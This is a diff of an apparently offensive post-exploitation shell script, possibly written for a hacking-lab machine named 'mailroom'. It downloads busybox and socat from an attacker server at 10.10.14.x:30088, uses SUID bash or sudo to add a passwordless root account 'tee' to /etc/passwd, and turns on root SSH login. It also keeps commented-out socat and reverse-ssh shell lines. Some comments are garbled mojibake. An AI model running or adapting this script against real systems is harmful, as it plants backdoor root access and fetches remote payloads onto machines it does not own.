@@ -4,8 +4,9 @@ exec 2>./y2
 exec 3>./z3
 set -x;
 TZ=UTC-8;date;
-rr="10.10.14.14";
-rr1="http://10.10.14.14:30088/";
+rr="10.10.14.10";
+[ ! -z $ip2 ] && rr=$ip2;
+rr1="http://${rr}:30088/";
 
 s1="export PATH=\$PATH:/tmp;TZ=UTC-8;
 uptime;grep NA /etc/os-release 2>&1;
@@ -55,10 +56,12 @@ b="busybox"
 b2="/tmp/${b}"
 soc="./socat"
 soc2="/tmp/${soc}"
-rr1="http://10.10.14.14:30088/"
+#rr1="http://10.10.14.14:30088/"
 rr2="${rr1}${b}.bin"
 rr3="${rr1}socat.bin"
 rr4="file_put_contents('${b}',file_get_contents('${rr2}'));chmod('${b}',0777);"
+
+
 
 
 which busybox && b2=`which busybox`
@@ -81,6 +84,8 @@ echo 9981;
 d0="/bin/sh"
 (which ash) && d0=$(which ash)
 (which bash) && d0=$(which bash)
+
+
 
 # [ -u FILE ] ?|???? FILE ?-???¨??”è??????o?SUID (set user ID)?????o????€?
 
@@ -118,15 +123,15 @@ d0="/bin/sh"
 
 # bash with suid
 (which bash) &&
-    {
-        [ -u $(which bash) ] &&
-            {
-                grep "tee" /etc/passwd || bash -p -c '(
-                cp /etc/passwd /etc/passwd.bak;
-                echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
-                )'
-            }
-    }
+{
+  [ -u $(which bash) ] &&
+      {
+          grep "tee::0:0:toor" /etc/passwd || bash -pc '(
+          cp /etc/passwd /etc/passwd.bak;
+          echo "tee::0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
+          )'
+      }
+}
 
 
 
@@ -143,7 +148,8 @@ ssh_1001="(${b2} netstat -an | grep \":1001\") && echo 1001_nice ||
                     echo exit
                     echo exit
                 ) | script /tmp/null
-            )" ; # for  goorm or git_runner
+            )" ; # for   git_runner  
+
 
 shsC='(${b2} ps aux|grep -v echo|grep -E "[s][s][h][d]")&&(grep "^PermitRootLogin yes" /etc/ssh/sshd_config&&echo sshd_yes_nice||sed -i "s/^#\?\(PermitRootLogin\)/\1 yes#/g" /etc/ssh/sshd_config)||echo ssh_cfg_fail'
 
@@ -160,11 +166,23 @@ echo 7749;
         echo "${ssh_1001}" >>/tmp/deal
     )
 
+
+    [ "$HOSTNAME" = "mailroom" -o "$hostN2" = "mailroom" ] && (
+        grep "tee" /etc/passwd ||
+            (
+                cp /etc/passwd /etc/passwd.bak;
+                echo "tee::0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
+            )
+        echo "${ssh_1001}   ${rr}   ${rr1} " >>/tmp/.deal;
+        chattr  +a /tmp/*;
+    )
+
+
     [ "$HOSTNAME" = "out" ] && sh -c "${shsC}" && /etc/init.d/ssh restart && (
         grep "tee" /etc/passwd ||
             (
                 cp /etc/passwd /etc/passwd.bak
-                echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd
+                echo "tee::0:0:toor:/tmp:/bin/bash" >>/etc/passwd
             )
         #sh -c "${ssh_1001}"# ??′?—?????”¨??€??ˉ1001??ˉ??￡
     )
@@ -182,10 +200,12 @@ echo 8864;
     /etc/init.d/ssh restart"
 
     grep "tee" /etc/passwd || (
-        sudo bash -c 'id;cp /etc/passwd /etc/passwd.bak;echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
+        sudo bash -c 'id;cp /etc/passwd /etc/passwd.bak;echo "tee::0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
         $ssh_1001 '
     )
 )
+
+
 
 
 d1="sh -il"
@@ -238,6 +258,7 @@ cd /tmp;
         [ ! -f 0a9.txt ] && break
        #dns_rev77=\$(./busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114  | grep -oP \"(?<=Address:\s).*\d\$\" ); #
        echo \${rr};
+       echo 9512;
        echo ${rr};
         #${soc2} -t5 exec:\"$d1\",pty,stderr,setsid,sigint,sane tcp:\${dns_rev77}:34292;
        #if [ -f /tmp/upx_reverse-sshx64.bin ];then chmod 0777 ./upx_reverse-sshx64.bin;upx_reverse-sshx64.bin -v -b 40044 -p 20022 \${rr};else sleep 4;continue;fi
